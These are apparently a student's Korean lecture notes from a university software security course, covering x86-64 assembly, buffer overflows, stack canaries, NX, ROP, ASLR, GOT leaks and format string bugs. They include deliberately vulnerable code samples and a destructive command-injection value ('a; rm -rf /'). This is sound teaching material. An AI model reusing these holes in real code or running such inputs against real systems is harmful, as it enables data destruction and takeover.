# 해킹및정보보안  

<br>

#### Introduction  

<br>

별도의 교재는 따로 존재하지 않는다. `실습 위주`  
선수 과목: C, Python, CSE3030(컴퓨터시스템개론) `Intel x86-64`, CSE4100(시스템프로그래밍)  

<br>

`plus alpha: ChatGPU의 사용에 관하여`  
- 과제에 사용하는 것은 **기본적으로 허용**이 된다.  
- 다만, 허용이 된다라는 것이 쓰기를 권장하는 것은 **절대 아니**라는 것을 알고 넘어가자.  
- 스스로 사유하여 발전하는 경쟁력 있는 인재가 되고 싶다면 너무 의존하지 않는 것이 좋을 것이다.  
- 이 수업에선 ChatGPT가 사실상 많이 도움이 되진 않을것이다.  

<br>

# 1. Course Overview  

<br>

## 1.1 Goal and Scope of this Course  

<br>

`5p.`  
사용자가 모종의 Request를 Server에 보내고  
Server가 Handle을 통해 Response를 한다.  

<br>

`6p.`  
해커가 서버의 취약점을 파고들어 공격을 하는 것, 그것이 해킹이다.  

<br>

`7p.`  
본 강의에서 우리는 **Software Security**에 대해서 집중할 것이다.  
- Vulnerability 취약점  
- Exploitation 공격  
- Mitigation 방어  
- Detection 감지  

<br>

`8p.`  
어떤 Software를 다룰것인가?  
- Linux Applications  
- OS, web도 가볍게 다를 것이다.  

<br>

`9p.`  
Hacking(CSE4104) != Cryptography(CSE4188)  

<br>

## 1.2 Basic concepts and Terminologies in Security  

<br>

#### CIA Properties  
> Security의 목표  
1. **C**onfidentiality, 기밀성: 보안 자료는 보안으로 유지되어야한다.  
2. **I**ntegrity, 무결성: 데이터가 변조되면 안된다.  
3. **A**vailablity, 가용성: 사용 가능해야한다.  

<br>

#### Common Types of Attacks  
> Exploitation, 공격의 양상  
1. Denial-of-Service: 프로그램을 과부하 상태로 만들어 사용자들이 해당 자원에 접근할 수 없도록 하는 공격  
2. Code Execution: 악의적 코드가 취약한 시스템에서 실행되도록 만드는 공격  
3. Privilege Escalation: 강제 권한 상승  
4. Information Leakage: 의도하지 않게 민감한 정보가 노출되도록 만드는 공격  

<br>

#### Threat Model  
> 넓은 의미: 어떤 시스템의 전반적인 취약점을 파악하고 검사하는 모델 자체  
>> 좁은 의미:   
>> - 임의의 유저에게 무엇을 허가해줄지  
>> - 해커가 어떤 공격을 하고자 하는지  
>> - 해커가 어떤 대상을 공격할지  
- 좁은 의미가 더 많이 쓰인다. 일종의 시나리오라고 생각하면 된다.  

<br>

# 2. Introduction to Software Vulnerability  

<br>

소프트웨어의 버그와 취약점에 대해서 알아보자.  
일단 취약점$`\in`$버그이며, 취약점(Vulnerability)이란 Security Issue를 일으키는 버그이다.  

<br>

**Example 1**  
다음은 간단한 인터넷 뱅킹 코드이다.  
```python
my_balance = 1000
def send(recipient):
	print("How much do you want to send?")
	val = read_int()
	if (val <= my_balance):
		my_balance = my_balance – val
		... # Increase the balance of recipient
```
Missing validation for negative numbers  
만약 사용자가 -1000이란 값을 입력했다면 오히려 잔고가 늘어나는 심각한 버그가 발생할 것이다.  

<br>

**Example 2**  
다음은 username으로 cmd를 생성하는 가상의 웹서비스 코드이다.  
```python
def service():
	username = read_from_packet()
	logdir = "./log/" + username
	cmdline = "mkdir %s" % logdir
	os.system(cmdline)
```
Command injection attack  
`"a; rm -rf /"`를 날리면 파일 시스템의 디렉토리를 삭제하는 명령어도 실행되게 되어 난리가 난다.  

<br>


<br>

**Example 3**  
사용자 이름을 에코백 해주는 간단한 코드  
```c
int main(void) {
	char buf[32];
	printf("Input your name: ");
	scanf("%s", buf);
	printf("Your name: %s\n", buf);
	return 0;
}
```
Buffer Overflow  
32보다 긴`"AA...A`를 입력하게 되면 BOF가 일어나 프로그램이 다운된다.  

<br>

Buffer Overflow & Memory Corruption  
`scanf()`, `gets()`  
그럼 Buffer 뒤에 정확이 어떤 종류의 데이터가 덮어씌워지는가?  
이를 통해 어떤 Hacking이 일어날 수 있는가? 를 찬찬히 배워나갈 것이다.  

<br>

Low-level Internals  
<img src="Docs/Pasted image 20240910122732.png" width="450">
  
컴퓨터의 Low-level operation을 컨트롤하는 것이 **Assembly** 코드이기 때문에 우리는 이에 대해 알아놔야 할 필요가 있다.  

<br>

# 3. Assembly (x86-64)  

<br>

## 3.1 Brief Introduction of Assembly & Intel x86  

<br>

왜 Assembly를 배워야할까?  
Assembly Code가 CPU가 직접적으로 이해할 수 있는 코드기도 하고  
Assembly를 이해한다는 것은 CPU의 작동 방식에 한발짝 다가간다는 뜻이기 때문이다.  

<br>

그렇다면 CPU는 어떻게 동작할까?  
<img src="Docs/Pasted image 20240910125134.png" width="450">
  
>Inst Fetch -> CPU works by Inst -> PC update point at the next Inst  
- Inst를 Fetch해오는 것도 결국 컴퓨터이기 때문에 byte sequence를 Fetch 해오는 것이다.  

<br>

Intel x86은 뭐죠 그럼?  
x86은 Intel에서 개발된 CPU 아키텍처 family이다.  
x86-64란 64bit 체계로 돌아가는 그 중의 하나인 것이다.  
이는 Assembly 언어를 부르는 명칭이기도 하다.  

<br>

## 3.2 Data Representation in CPU and Memory  

<br>

여기서도 핵심만 집고 넘어가보자.  

<br>

컴퓨터의 모오든 것은 bit로 표현되어있다.  
Byte Ordering에 대해 주의하자. `Endian Issue`  

<br>

메모리의 구조를 살펴보자.  
> Memory는 Byte의 Array이다.  
<img src="Docs/Pasted image 20240910130321.png" width="450">
  

<br>

Word Size  
> 어떤 CPU 아키텍처가 있을 때 가장 효율적으로 다룰 수 있는 데이터의 단위  
- x86-64에선 8 byte  
- Registers in CPU, Transfer Unit, Memory Address(Pointer Variable)  
- 이론 상으로는 $`0\sim 2^{64} - 1`$까지 사용 가능하나 실제로는 $`0\sim2^{48} - 1`$까지이다.  

<br>

Byte Ordering (Endian)  
> x86-64에서는 Little Endian이다.  
> MSB를 큰 주소(Highest Address) 저장하는 것!  
- int x = 0x12345678을 메모리에 저장한다고 생각해보자.  
- 그러니까 &x에 저장되어있는 값을 조사하면 x86-64에서는 78이 나오는 것이다.  
<img src="Docs/Pasted image 20240910130757.png" width="450">
  

<br>

★ *그런데 String은 Endian과 하등 관계가 없다.*  
항상 문자열은 앞 - 뒤 -> 작은 주소(lowest) - 큰 주소(highest)이다.  

<br>

## 3.3 Basic Instruction of x86-64 Assembly  

<br>

#### x86-64 아키텍쳐의 Register  
- %rsp: stack pointer  
- %rip: instruction pointer (program counter)  
다른 건 arithmetic 연산이라던가, 값 저장이라던가 자유롭게 사용 가능하지만 몇 가지 규칙들이 있다. `Calling Convection`  

<br>

레지스터 하나는 8-byte이며 그 일부를 지칭하기 위한 이름들도 있다.  
%rax에 long 타입 같은 걸 저장한다고 치면  
4-byte짜리 %eax  
2-byte짜리 %ax  
그 ax를 쪼개서 또 1-byte짜리 %ah, %al가 있다.  

<br>

비슷한 방식으로 명칭을 붙인것끼리 묶으면  
%rax, %rbx, %rcx, %rdx  
%rdi, %rsi  
%r8, %r9-%r15  
이렇게 묶을 수 있다.  

<br>

athimetic operation  
transfer data  
variables are mapped to registers or memory slots  

<br>

Calling convention을 간단히 소개해보겠다.  
함수의 인자를 전달할 때 x86-64는 다음 순서로 전달한다.  
%rdi -> %rsi -> %rdx...  
Return 값은 %rax에 전달된다.  

<br>

#### mov  
> Data Move Instruction  
>> mov   Sourve, Destination  
- movb, movw, movl, movq (1, 2, 4, 8 bytes)  
- 몇 바이트인지 명백할 때는 생략하기도 한다.  
- Operand에는 직접 값이 들어오거나, 레지스터가 들어오거나, 주솟값이 들어오기도 한다.  
- Immediate: $`0x400, `$-533  
- Register: %rax, %r13  
- Memory: (%rax), 0x1000  

<br>

예제 중 두 개만 봐보자.  
```
movq $`-147, (%rax)  // *a = -147;
mov 0x1000, %rdx    // d = *(0x1000);
```

/ Partial Access on Register
mov `$1, %eax # %rax : 0x0000000000000001
%eax에 값을 저장한다 치면 아래쪽 4-byte에 저장하고 위쪽 값은 0으로 초기화된다.  

<br>

/ Byte Extension  
movz: zero extension `1-byte 값을 2-byte에 zero-extension 해서 넣어라`  
movs: sign extension `4-byte 값을 8-byte에 sign-extension 해서 넣어라`  

<br>

/ Memory Access  
mov 뒤에 suffix를 생랼하면 안되는 경우라고 생각하면 된다.  
movl $`0x4142, (%rax)  
매모리의 어느 범위를 접근하느냐에 따라 suffix를 달리 붙여줘야한다.
mov 0x20(%rbx, %rcx, 4), %rax stride가 있는 경우이다. 0x20 + 5rbx + %rcx * 4
stride는 1, 2, 4, 8중 하나만 쓸 수 있다.
배열 접근을 표현할 때 쓴다는 것을 상기하자.

#### Arithmetic & Logical Instructions

/ 두 개의 피연산자를 가지는 것들
add같은 경우 2개의 인자 밖에 없는데 두 번째 인자가 Destination의 역할도 겸한다고 생각하면 된다.
Partial Access 같은 기묘한 현상이 add에서도 일어난다는 걸 side note 해놓고 가자.

/ 하나의 피연산자만 가지는 것들
shr, sar, shl 같은 경우 두 개를 가질수도, 하나를 가질수도 있는데 하나인 경우 1이 생략된 것이라고 생각하면 된다.
shr: Logical right shift
sar: Arithmetic right shift

#### lea Instruction
> Perform complex computations
>> lea    0x20(%rbx, %rcx, 4), %rax
- 그냥 요 연산을 해서 rax에 저장을 해라 라는 instruction
- Memory Access는 일어나지 않는다.
- Pointer Computation을 위해 만들어진 Instruction이다.
- Arithmetic Operation을 할 때도 어셈블리 코드를 줄이기 위해 lea를 응용해서 사용하기도 한다.

/ mov & lea
mov은 실제로 memory access를 하는 반면
lea는 메모리 주솟값 계산까지만 하고 멈춘다.

마지막으로 pdf의 Example을 가볍게 보고 Instruction의 응용을 간단히 익혀보자.

## 3.4 Control Instructions of x86-64 Assembly

Assembly에서의 조건문과 반복문의 표현

#### Flag Registers
> %ZF, %SF, %CF, %OF
- Instruction의 결과에 따라서 자동적으로 업데이트 된다.
- 0과 1 중에 어떤 걸로 세팅이 되어있느냐에 따라 je 같은 instruction이 결정을 내린다.
- 조건을 체크하는 register들이라고 생각하면된다.
- 어떤 규칙에 따라서 업데이트 되는지에 대한 디테일은 생략하고..

/ Conditional Jump
많이 사용되는 패턴들만 한 번 살펴보자.
sub, cmp, and, test같은 operation이 실행되고
je, jne, jg, jl 같은 Conditional Jump instruction이 수행된다.
헷갈리면 pdf 38p.의 박스 안에 있는 설명처럼 외워보자.

/ jxx Instructions
나중에 필요할 때 참조 가능할 정도로만 기억해두자.

/ cmp & sub
위 inst를 하면 대부분의 경우를 커버할 수 있는데
and와 test도 0과 sign check를 할 때 많이 쓰인다.
sub, and는 %Dest를 업데이트 안하고
cmp, test는 %Dest를 업데이트 한다.

setx Dest
cmox Src, Dest

Loop, Switch는 자세히 알 필요는 없고 어셈블리 코드가 주어졌을 때 아, 이 패턴은 C 코드로 이런 느낌이겠구나 라고 할 수 있을정도면 된다.

## 3.5 Function Call in x86-64 Assembly

Memory Structure
- Code: 머신 inst를 저장한다.
- Data: 전역 변수를 저장한다.
- Stack: 함수의 실행을 관리하기 위해 사용된다.

Stack
- Bottom (High Address)
- Top (Low Address): %rsp 레지스터가 가리키고 있다.
- Top 쪽으로 쌓인다.

/ Push Instruction
1. 저장할 Value 결정
2. %rsp를 8만큼 줄인다.
3. %rsp가 가리키는 주솟값에 value를 Write한다.

/ Pop Instruction
Push와 반대

#### Change of Control-Flow

multstore: mult2를 사용한 결과를 dest가 가리키는 곳에 저장하는 함수
mult2: 곱셈을 하는 단순한 함수

#### Passing Data

/ Calling Convention
register를 push하고 pop하는 이유
call로 mult2를 부르고 어디로 돌아와야할지를 stack에 push해놓고 점프를 한다.
ret는 call 명령어와 반대로 실행된다. `= pop %rip`

multstore는 mult2를 부르는 caller이기도 하다.

#### Memory Management

/ Stack Frame
- 저장된 Return Address
- 필요한 경우 지역변수
- 필요한 경우 Callee-saved 레지스터 백업

함수 호출이 늘어날 때마다 Stack Frame이 차곡차곡 쌓여나간다.

재귀 함수의 경우 같은 함수더라도 다른 실행 flow로 취급해서 Stack Frame도 별개다.

15213: v1 지역변수를 위해 Stack Frame에 할당한 공간
왜 lea를 쓰는지 정확하게 이해하고 넘어가자!

# 4. Buffer Overflow

#### Memory Layout
<img src="Docs/Pasted image 20240924125518.png" width="200">


## 4.1 Buffer Overflow (BOF)

#### Buffer Overflow (BOF)
> 프로그램이 고정된 크기의 메모리 공간(buffer)에 저장된 데이터를 초과하여 데이터를 쓰려고 할 때 발생하는 오류

C언어
- 고정 크기 배열
- NULL 종료 문자열 처리 문제
- 메모리 Boundary 검사 없음

어떤 중요한 Data가 BOF에 의해서 오염될 수 있을까?
- Stack Frame에 저장되어있는 Return Address
- 공격자가 Return Address를 덮어 쓰면, 즉 %rip를 마음대로 조작하면 Code Execution Type의 공격으로 이어질 수 있다. `Control Hijack`

Classic Buffer Overflow
- Unsafe String-Handling: `gets()`, `scanf("%s, ...")`, `strcpy()`, `strcat()`..
- Stack Overflow랑 헷갈리지 말자:
- 프로그램의 호출 Stack이 제한된 크기를 넘어서 Stack 공간이 모두 소진될 때 발생한다.
- 재귀 함수 호출이 너무 깊거나 함수 호출이 너무 많이 일어나 Stack Memory가 고갈될 때 발생한다.
- Morrris Worm (1988)

이렇게 해서 가장 전통적인 BOF에 대해서 알아보았다.
하지만 BOF가 Stack에서만 일어나는 것은 아닐 것이고, 위에서 설명한 상황에서만 일어나는 것도 아닐 것이다. `True/False`

General Discussion on BOF
- Heap-Allocated Memory에서도 일어날 수 있다.
- 또한, `gets()` 같은 안전하지 않은 함수를 사용하지 않아도 `arr[-1]`와 같은 잘못된 접근을 통해서도 BOF가 일어날 수 있다.

다른 Memory Section에서도 일어날 수 있고, Unsafe 한 함수를 사용하지 않아도 일어날 수 있다는 것이다.

#### Example Program

```c
void echo(void) {
	char buf[8];
	gets(buf);
	puts(buf);
}

int main(void) {
	echo();
	return 0;
}
```

gets()는 무려 man 페이지에서도 사용하지 말라는`..` 매우 위험한 함수이다..

15글자 까지 (NULL byte까지 포함해서 16글자)는 괜찮아 보인다.
그런데 16글자부터 Segmentation Fault가 나타난다.

그렇다면 왜 17 byte부터 그런 Crush가 일어난 것일까?

Assembly를 보고 Stack Frame을 그려낼 수 있어야 한다.
- %rsp를 0x18 만큼 내려서 공간 확보
- %rid에 %rsp + 8의 주솟값 전달
- `buf[8]`의 위 아래 위치에 Unused Space가 발생하는 것을 볼 수 있다.

초록색 점선 박스를 좀 더 자세히 봐보자. `15p.`
Little Endian 때문에 헷갈릴 수도 있으니 세로 말고 가로로 봐보자.
input을 주면 초록색 화살표부터 한칸당 글자 하나씩 채워질 것이다.
Unused 8byte에는 의미 없는 초기화 되지 않은 값들이 들어가있을 것이다.
1. 8 < input:
 - 입력을 점점 늘려가면 16p.처럼 8을 넘어가도 BOF는 일어나나 Seg Fault는 나지 않는다.
2. 16 < input:
- 18p.를 보면 Stack의 Saved Return Address가 오염되기 시작하면서 Corrupted가 일어난다.
- add -> ret의 순간 잘못된 값을 읽게 되는 것이다.
- 아, 나는 401161이 아니라 401100으로 가야하는건가? 가되는 것이다. `LSB가 오염됨`
+) abc(61 62 63)를 짚어넣으면 cba(636261)로 돌아가게 된다.

<img src="Docs/Pasted image 20240926124030.png" width="450">

> 다음과 같이 왼쪽에 C 코드, 오른쪽에 Assembly를 주면 Stack Frame을 대충 그리고 가로로 긴 그림과 같은 자세한 그림도 그릴 수 있게되어야 할 것이다.

그렇다면 이를 이용해서 임의의 악성 코드를 어떻게 실행할까?

#### Code Execution

%rip Points out Stack Section (`buf[8]`)
- 정상적인 상황이라면 %rip Register는 Code Section 혹은 Shared Library Section을 가리키고 있어야 한다.
- %rip가 Stack Section을 가리키는 상황이 매우 비정상적인 상황이라는 것을 인지하고 있어야 한다.

그렇다면 해커는 어떻게 악겅 코드를 집어넣는걸까?
- "j0YX45P"란 ASCII코드로 변환하여 해석하면 x86-64 Assenbly Instruction이 된다.
- 결국 모든것은 byte의 나열이기 때문에 이렇게 할 수 있는 것이다.
결국 해커는 { push pop pop xor push }라는 일종의 함수와 같은 것을 실행할 수 있게 되는 것이다.

/ *Shellcode*
악의적인 행위를 수행하기 위해 고안된 작은 크기의 코드
주로 시스템의 제어권을 탈취하기 위해 사용된다.
- 공격자가 시스템의 취약점을 악용해 쉘코드를 실행하면, 공격자는 해당 시스템에서 쉘을 실행하여 다양한 명령어를 수행할 수 있다.
- 이제 여기에 ls; rm-rf* 날리면 끝나는 것이다.

그런데 여기까지는 꽤나 옛날의, 역사 깊은 공격방법이다.
수십년 간의 공방의 세월을 무시하지 말자.

우선 기본적인 BOF의 방어방법을 봐보자.
1. `fgets()`나 `scanf("%8s", ...)`와 같은 boundary safe한 함수를 사용하자.
- BOF 취약점을 원천 제거해버리자.
2. Exploit Mitigation
- BOF 취약점이 있더라도 악성 코드 실행 자체를 막아보자.

## 4.2 ⚔️ of Buffer Overflow

#### 🛡️ (Mitigation) Stack Canary
> 함수 호출 시 Stack Frame에 특별한 **Canary** 값을 삽입하고, 함수가 종료될 때 그 값이 변조되지 않았는지 확인하는 방식으로 동작한다.
> **Canary** 값이 변경되면 프로그램은 이를 인지하고 실행을 중단하여 BOF 공격을 차단한다.
- Assembly를 보면 함수에 진입하자 마자 Canary Setup을 하는 것을 볼 수 있다.
- %rax에 Random한 값들을 짚어넣어서 buf 아래에 짚어넣는다.
- Canary check에서 값 비교를 통해 값이 변하지 않았을 때만 Assembly의 밑으로 넘어간다.

/ 🛡️ 🔫 *Stack Canary* ★★★
Canary를 다시 우회해보자.
1. 악성코드 실행을 포기:
- Canary 전에 있는 다른 Local Variable에 있는 값을 다른 값으로 덮어씌우는 것은 가능하다는 것인데, 이만으로도 충분히 위험한 공격이다.
2. Heap에서의 BOF exploit:
- Stack이 아닌 영역은 Canary가 커버를 못한다.
- Overwrite Hunction Pointer Field in an Heap-Allocated Struct
3. Canary로 탐지되지 않는 특정 Type의 BOF:
- 10p. 같은 `arr[idx]` 공격은 Canary로 막을 수 없다.
4. Memory Disclosion:
- Canary의 값 자체를 알아낸다.

#### 🔫 (Bypassing) Memory Disclosure

write는 boundary-safe하지 않다.
write 인자로 받는 len을 아무런 검사도 안하고 출력하면 사용자가 원하는 바이트만큼 일어낼 수 있게된다.
따라서 Stack Canary 값을 알아낼 수 있게된다.

#### 🛡️ (Mitigation) NX

NX: Non-eXecutable Memory
말그대로 메모리를 실행 불가능하게 만들어서 BOF 공격을 막는 방법이다.

강의자료 3p.를 보며 생각해보자.
예전에는 %rip로 가리킬 수 있기만 하면 모든 영역이 executable 했는데 이를 막겠다는 것이다.

stack영역은 Not Executable한 영역이라고 설정할 수 있는 것으로 설정하는 것이 NX set이다.
Stack, Heap, Data Section의 -r, -w, -x 등을 설정 가능하다.

으레 그렇든 BOF의 모든 공격으로부터 안전하진 않다.
이에 대해서는 강의자료 5에서 이어나가겠다.0

## Access Control & SUID

가장 쉬운 예제: file의 permission, `-rwxr..`

# 5. ROP(Return-oriented Programming)

## 5.1 System Call (Syscall)

User Program <- System Call -> OS(Kenel)

Syscall의 Assembly는 어떻게 생겼을까?
일단 함수 호출과 비슷하긴한데, 이제 이 함수가 Kernel의 함수이다.
`$0x2 같은 인자, 익숙할 것이다.
강의자료에는 진짜 간단하게 소개되어있긴한데, 후에 좀 더 자세히 다루겠다.  

<br>

우리가 만약 `open()`을 했을때, 우리는 Library의 syscall들을 호출하기위해 정의 되어있는 Assembly Instruction을 호출하는 것이다.  

<br>

좀 더 high level한 함수는 `fopen()`인데, 이 역시 결국은 Library에서 syscall들을 부르는 구조를 가지고 있다.  

<br>

## 5.2 ROP & ASLR  

<br>

`7p.`  

<br>

앞에서 우리는 NX까지 했다.   
만약 NX가 도입되었다고 했을 때, 그럼 우리는 이를 또 어떻게 Attack할 수 있을까?  

<br>

#### 🔫 Code Reuse Attack  
> 공격자가 취약한 프로그램의 코드를 새로 작성하지 않고 기존의 정상적인 코드 조각(함수나 라이브러리 코드)을 재사용하여 공격을 수행하는 기법  
- 예를들어, `execve()`에 argument로 `/bin/sh`만 전달할 수 있다면 Shellcode를 굳이 짤 필요없이 shell을 불러올 수 있다.  
- 이를 막겠다고 Memory의 Shared Library Section에 있는 Library Code를 실행 불가능하게 하면 빈대 잡자고 초가상간 불태우는 것이나 마찬가지다.  

<br>

/ *Return-to-Libc Attack*  
옛날의 Code Reuse Attack이다. 다음과 같은 이유로 비교적 쉬운 환경에서 공격이 가능했다.  
- x86-32 system 시절엔 argument를 조작하는 것이 쉬웠다.  
- Library Code들이 쉽게 예측 가능한 주소에 지정이 되어있었다.  

<br>

하지만 우린 x86-64 system을 고려하기 때문에 그냥 이런 Attack이 있었다는 것만 알아두자.  
그렇다면 우리는 어떻게 공격해야할까?  

<br>

**Challenge #1**  
```
어떻게 execve()에 첫번째 argument로 `/bin/sh`를 전달할 것인가?
```
%rdi가 우리가 원하는 `/bin/sh`를 가리키게 하고 %rip로 실행  
참고로 %rdi, %rsi 레지스터 등을 오염시키는 건 아직 다룬 적이 없다.  

<br>

**Challenge #2**  
```
ASLR(Address Space Layout Randomization)로 Memory Section을 Randomization을 했는데, 이를 어떻게 탐지할 것인가?
```
<img src="Docs/Pasted image 20241010123134.png" width="450">
  
다음과 같이 실행시킬 때마다 Section의 위치가 바뀐다. 그런데 Data, Code는 Performance 상의 이유로 그대로인 것을 볼 수 있다.  
물론 현대에는 Data와 Code도 모두 Radomization되어있다.  

<br>

#### 🔫 ROP (Return-oriented Programming)  
> 프로그램의 반환 주소를 조작하여 메모리 내에 있는 ROP Gadget을 연속적으로 실행하는 방식의 공격이다.  

<br>

/ *ROP Gadget*  
```
0x000000        pop %rdi
0x000001        ret
```
ret로 끝나는 조그만 코드 조각을 ROP Gadget이라고 한다.  
일반적으로 한 두개의 명령어로 이루어져 있으며 ret(반환) 명령어로 끝난다.  

<br>

**① 그럼 이 Gadget으로 뭘 하겠다는 걸까?**  

<br>

`14p.`  
일단 논의를 간편하게 하기위해 dummy space의 존재를 무시한다.  
return address가 `buf[]` 바로 다음에 있다.  
`15p.`  
0x4009b3에 ROP Gadget이 있는 것을 볼 수 있다. 그럼 여기로 Jmp한다.  
일단 `f()`라는 hacker아 주소를 알고있는 함수가 있다고 하자. `execve()`  
우리는 이 사진과 같이 stack을 덮어씌울건데, 이렇게 하면 원하는 함수를 실행시킬 수 있다.  
`16p.`  
그렇다면 실행되는 과정을 한 번 보자.  
return instruction이 ROP Gadget을 꺼내와서 %rip register에 쓰게되고  
rsp는 증가한다.  
`18p.`  
%rsp에 들어있는 걸 가져와서 %rdi를 업데이트한다.  
`19p.`  
결과적으로 `f(0x4142);`가 실행된다.  

<br>

> 결론적으로, %rdi의 값을 잘 조작해서 %rsp로 집어넣는다.  

<br>

**② 그렇다면 넣어야 할 인자가 늘어난다면 어떻게 해야될까?**  
`21p.`  
★ Q) 이렇게 덮어썼다고 가정할 때, 첫 번째랑 두 번째 인자로 어떤 값이 전달될까?  
A) `g(0x41, 0x61);`  

<br>

`24p.`  
첫 번째 Gadget의 return address가 착각해서 두 번째 Gadget의 시작 주소로 %rip의 값이 변화하게된다.  
`26p.`  
%rsp가 `g()`의 시작점이 되었을 때 %rdi와 $`rsi의 값을 보자.  

> 결론적으로,

**③ 그렇다면 이번엔 함수가 늘어난다면 어떻게 해야될까?**
☆ Q) 이렇게 덮어썼다고 가정할 때, 어떤 함수가 어떤 인자로 실행될까?
A) `f(0x41); h(0x61);`

`28p.`
여기까지는 이전과 동일하다. 그렇다면 `f()`에 진입한 시점에 대해서 살펴보자.
`30p.`
`f()`함수의 입장에서 보기에는 지금 %rsp 위치가 saved return address가 저장되어있는 주소이다. 그말인 즉슨 `f()`함수가 실행되며 왔다갔다 하더라도 결국 %rsp가 가리키고있는 주소로 돌아온다는 것이다.
`f()` 함수가 실행되는 동안 %rdi의 값이 유지된다고 보장할 수 없다.
`31p.`
즉 이 페이지부터 `32p.`까지의 %rdi의 값은 `...`이 되어야 맞는것이다.
`33p.`
이제 같은 flow로 `h()`도 연달아 호출되게 된다.

/ *Types of ROP Gadgets*
```
"add `$1000, %rcx; ret"
"xchg %rbx, %rdx; ret"         # 두 Regitster를 Exchange 하겠다.
"mov %rax, (%rbx); ret"        # %rax의 값을 %rbx에 덮어쓰겠다.
```
이런 Gadget들을 Chainning 함으로써 공격자는 다양한 logic과 operation을 수행할 수 있게된다.  

<br>

이렇게 `Challenge #1`을 극복하는 방법에 대해 알아보았다.  
이제 `Challenge #2`에 대해서 다뤄보자.  

<br>

#### 🛡️ ASLR(Address Space Layout Randomization)  
> 메모리 주소 예측을 어렵게 하여 BOF와 같은 메모리 취약점 공격을 방지하는 것  

<br>

이렇게 되면 우리는 Data랑 Code Section의 위치는 아는데 Stack Heap Library의 위치는 모르는 것이다.  
실제로 gdb로 알 수 있긴하지만 gdb를 쓰지 못한다는 가정 하에 문제를 풀어야 한다는 뜻이다.  

<br>

그렇다면 위 Mitigation에 대하여 공격을 어떻게 하면 좋을까?  

<br>

#### 🔫 Memory Disclosure Revisited  
> 다양한 Pointer 변수들을 통해 memory Layout에 대한 힌트를 얻는 방법으로 이 위치들을 찾아가는 것이다.  

<br>

다음은 Library Section, Libc 어딘가에 있는 `puts()`의 주소를 알아내오기 위한 코드이다.  
```c
int main(void) {
	int (*puts_fptr)(const char *);
	void * handle = dlopen("libc.so.6", RTLD_LAZY);
	puts_fptr = dlsym(handle, "puts");
	puts_fptr("Hello world");  // puts("Hello world") -> $` Hello world
	return 0;
}
```
당연하지만 ASLR 때문에 이 함수를 다시 실행하면 `puts()`의 주소가 바뀐다.

`puts()`의 주소를 기반으로 Libc의 다른 함수들의 주소도 알수 있게 된다.
왜냐하면 Libc Library의 시작 주소는 바뀌어도 내부 배치는 고정되어있기 때문이다. `ASLR은 시작주소 까지만 건든다는 것`
- `execve()`: p + 0x840
- `puts()`: p + 0xed0

(?) If leaked fptr_puts value is 0x7ffd3ed0:
- Base address p = 0x7ffd3000
- Address of execve() = 0x7ffd3840
- 그냥 단순 더하기 빼기다.

그럼 이게 진짜 될까?
우리가 과연 `dlopen()`이나 `dlsym()`이라는 요상한 함수를 쓸까?
안 쓸 것이다.
따라서 함수 포인터를 이용한 이 방법은 많이 사용되지 않는다.

이 코드가 우리에게 좀 더 익숙할 것이다. 그럼 이 코드도 공격 가능할까?
```c
int main(void) {
	char buf[8];
	write(1, "Hello", 5);
	read(0, buf, 160);
	return 0;
}
```
놀랍게도 Canary를 가정하지 않고 NX와 ASLR만 있다고 가정하면 공격 가능하다.

이를 위해선 자그마한 배경지식이 필요하다.

/ *Library Function Call*
다음 AS&T 코드를 보자.
```nasm
...
0x400579:    call 0x400430 <write@plt>
..

<write@plt>
0x400430     jmp *0x601018  # GOT entry ..
```
write@plt를 gdb를 실행시켜 봤다면 본적이 있을 것이다. 이게 뭘까?

/ *PLT and GOT*
<img src="Docs/Pasted image 20241015124853.png" width="450">

GOT: 함수 포인터들을 담고있는 테이블
- GOT는 runtime시 함수가 호출되어야하는 상황이 왔을 때 table entry가 동적으로 채워지게 된다. (컴파일 시 생성되는게 아니다!)
PLT: 이 테이블을 가리키는 snippet

그럼 GOT는 자동으로 만들어지니까 Libc의 함수 포인터에 대한 데이터를 알아낼 수 있게되지 않을까? 가 Main Idea다. 이는 우리가 앞에 배웠던 ROP로 가능하다.

#### 🔫 ROP for Memory Disclosure
44p., 45p. `이부분 제대로 안 들음... 물어보자`
write 함수 호출
뒤에 다른 ROP Gadget을 보내줌으로써 다른 함수들도 마음대로 호출할 수 있다.
그렇게 해서 최종적으로 40p.의 코드도 exploit하는 것이 가능하다.

**Note**
- Libc 파일로 접근하지 못하더라도 여전히 Attacker는 Libc의 버전을 유추할 수 있다.
- 위에서는 Library Section만 하긴 했는데, Stack이나 Heap같은 경우도 똑같은 Idea를 사용하는 것이 가능하다.

/ *Position-Independent Executable (PIE)*
ASLR의 진화 버전으로, Data와 Code도 Radomization 가능하게 된 것 `기술의 발전이란`
- 컴파일러가 Assembly Code를 생성할 때 굉장히 Overhead가 커지게 되지만, 보안의 관점에서 Worth-It 하다고 판단했기 때문에 이 기술이 생겨난 것이다.

**Lesson**
- 해커는 우리가 생각했던 것보다 집요하군 `집착광해커`
- 내가 코드를 생각보다 안전하게 잘 짜야겠구나 SegFault 없앴다고 기뻐할 때가 아니란 뜻
- PLT/GOT의 존재 같은 것, 컴퓨터 시스템의 내부 구조를 잘 알고 있어야 안전한 코드도 잘 짤 수 있을 것이다.

--------------------------------------------------------

# 6. Format String Bug

이제 BOF말고 다른 취약점에 대해서도 알아보자.

#### Format String Bug
> 사용자 입력을 그래로 `printf()`와 같은 **형식 지정 문자열 함수**에 전달할 때 발생하는 보안 취약점이다.
- BOF만큼 많이 일어나는 취약점은 아니다.

오랜만에 `printf()`를 살펴볼까?
/ `int printf(const char *format, ...)`
- format string을 format specifier를 사용하여 인자에 지정한 내용을 출력하는 함수이다.
- format specitier를 만날 때마다, 출력해야 할 인자가 하나 들어왔구나, 하고 형식에 따라 출력하는 방식이다.

그렇다면 `ptinrf()`사용 시 할 수 있는 실수들에 대해서 살펴보자.
```c
printf("%d %c %x\n", i, c);
```
- `%x`를 처리하기 위해서 우리가 인자로 전달하지 않은 4번째 argument까지 처리하려든다.
- **Result:** x86-64에 따르면 `%rdi -> %rsi -> %rdx -> %rcx -> %r8 -> %r9`이므로 `%rcx`의 value 해당하는 값을 출력하게된다.

더 심각한 실수는 다음과 같다.
```c
printf(buf);
```
- **Result:** buf의 개수에 따라 %rdi부터 %r9 까지의 레지스터들이 어떤 값을 가지고 `printf()`함수를 작동시켰구나를 알수있게된다.
- 다음과 같이 우리가 실제로 사용하지 않는, return addr 옆에 차곡차곡 쌓여있는 인자들도 가져올 수 있다.<br><img src="Docs/Pasted image 20241017122824.png" width="300">


`9p.`
⚠️ Stack에서의 Memory Disclosure
